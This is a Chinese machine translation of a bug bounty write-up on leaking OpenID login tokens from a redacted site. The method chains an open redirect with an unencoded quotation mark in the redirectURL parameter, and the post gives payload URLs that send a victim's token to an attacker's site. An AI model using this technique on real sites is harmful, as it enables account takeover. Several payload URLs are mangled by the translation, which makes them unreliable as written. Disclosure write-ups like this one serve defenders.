<html>
<head>
<title>Leaking OpenID tokens with “ — the bug right infront of you</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">泄漏OpenID令牌“——就在你面前的错误</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/leaking-openid-tokens-with-the-bug-right-infront-of-you-95c1fb4a86e9?source=collection_archive---------0-----------------------#2019-05-21">https://infosecwriteups.com/leaking-openid-tokens-with-the-bug-right-infront-of-you-95c1fb4a86e9?source=collection_archive---------0-----------------------#2019-05-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/90705df34847871d46ad4c3767294ed8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1170/format:webp/1*Y16i2013Eu3KXIa9Nfiwww.jpeg"/></div></figure><p id="ab98" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这只是一个简短的帖子，解释我发现的一个漏洞的细节，我相信许多研究人员在测试一个程序的登录流程时忽略了这个漏洞。这个错误可能会影响其他使用OpenID登录流程的网站，我建议进行测试:)(如果他们错误地配置了他们的redirectURL以允许* . ther domain . com/*是最好的，因为您找到开放URL重定向的范围会更大)</p><h2 id="5519" class="ks kt iq bd ku kv kw dn kx ky kz dp la kf lb lc ld kj le lf lg kn lh li lj lk bi translated">登录流程</h2><p id="f574" class="pw-post-body-paragraph ju jv iq jw b jx ll jz ka kb lm kd ke kf ln kh ki kj lo kl km kn lp kp kq kr ij bi translated">所以，继续装窃听器。当登录到redacted.com时，它使用了一个OpenID系统，该系统的工作方式与Oauth登录流程完全相同，在Oauth登录流程中，它获取一个redirectURL，并在成功登录后重定向到该URL。随着重定向，一个令牌被发送，作为一个黑客，我想要这个令牌！</p><blockquote class="lq lr ls"><p id="9c09" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated"><a class="ae lx" href="https://www.redacted.com/login?redirectURL=/here" rel="noopener ugc nofollow" target="_blank">https://www.redacted.com/login?redirectURL=/here</a></p></blockquote><p id="1fe8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以在redirectURL参数中输入*.redated.com，它会重定向。我很快找到了一个打开的url重定向，但遗憾的是，在最终重定向到我的网站时，用户登录令牌没有被附加，因为它被设置在hashfragment上。(#)Sadface.jpeg</p><p id="9246" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我的第一个想法是，如果我用引号将它嵌套在一个参数中，会发生什么？我希望在重定向时将用户的登录令牌作为一个参数值用引号括起来。回过头来看，因为它是以hashfragment为背景的，我不知道我为什么会这样想。但是这表明你在黑客和测试方面永远不会出错..扔掉你想扔的东西，看看会发生什么！:)</p><p id="72d1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是一个易受攻击的URL:</p><blockquote class="lq lr ls"><p id="c49d" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">【https://www.redacted.com/login? T2】redirect URL = https % 3A % 2F % 2 fevil . redated . com % 2f redirect % 3 furl % 3d https % 3A % 2F % 2 fwww . my site . com % 2F？c= "</p></blockquote><p id="d1d1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我测试时，这个bug起作用了！..但不是我期望的那样。然而，我在攻击者的网站上成功地获得了我的令牌。Happyface.jpeg</p><p id="3b44" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我只需要弄清楚是怎么发生的以及发生了什么。</p><p id="d77d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当测试登录流并希望它们在成功登录后重定向到我的网站时，我将总是编码(有时是双重编码)以确保重定向时浏览器以正确的顺序解码值。<strong class="jw ir">了解一个网站如何处理某些编码是很重要的</strong>。(特别是当需要找到绕过:D的过滤器时)</p><p id="b93a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">例如:下面的有效载荷不编码可能无法成功重定向到您想要的目的地(就像我说的，有时双重编码，%252F，这在您测试时会变得很明显)。</p><blockquote class="lq lr ls"><p id="e66d" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">，<a class="ae lx" href="https://www.redacted.com/login?redirectURL=https%3A%2F%2Fevil.redacted.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fwww.mysite.com%2F?c=" rel="noopener ugc nofollow" target="_blank">https://www.redacted.com/login?redirectURL=https</a>://evil . redc ated . com/redirect？url=https://myevilsite.com/</p></blockquote><p id="d422" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">不管怎样，回到实际的bug。如果你注意到我实际上留下了一个未编码的字符…引号！“—我只是在测试看看会发生什么，我可以在引用中嵌套参数，记得吗？然而，在重定向到我的网站之前，redacted.com实际上编码为“to"——由于这个简单的编码，它使得用户的登录令牌能够通过重定向走私到我的网站。如果我使用了%22，那么就不会有令牌泄露。它必须是”——正是如此。没有引号，没有令牌泄露。</p><p id="20bd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后的有效载荷简直就是https://www.redacted.com/login?的<strong class="jw ir">T3redirect URL = https % 3A % 2F % 2 fevil . redated . com % 2f redirect % 3 furl % 3d https % 3A % 2F % 2 fwww . my site . com % 2F？c="  </strong>当用户登录时，他们的登录令牌被发送到攻击者的服务器。同样，如果没有“，<em class="lt">这个bug就不能工作</em>。但是感谢”，我现在是这个用户:)</p><h2 id="35a3" class="ks kt iq bd ku kv kw dn kx ky kz dp la kf lb lc ld kj le lf lg kn lh li lj lk bi translated">外卖食品</h2><p id="3b05" class="pw-post-body-paragraph ju jv iq jw b jx ll jz ka kb lm kd ke kf ln kh ki kj lo kl km kn lp kp kq kr ij bi translated">说到黑客，没有对错之分。除非你尝试，否则你怎么知道？我发现我的大多数错误都来自于手动地与功能交互并试图破坏它们，而黑客的美妙之处在于:<strong class="jw ir">你可以尝试任何事情！实际上任何事情(当然是在合理的范围内…！)</strong></p><p id="2881" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以我们有了它，一些如此简单的东西就在每个人面前，却有着巨大的影响力。正如开篇文章中解释的，这可能会影响更多的程序，因为这是许多网站使用的非常流行的登录流程，但这也取决于网站如何处理某些字符的编码，以及他们是否错误配置了重定向URL等:)</p><p id="7b64" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">快乐狩猎&amp;黑客❤</p><p id="29be" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">-齐亚诺</p></div></div>    
</body>
</html>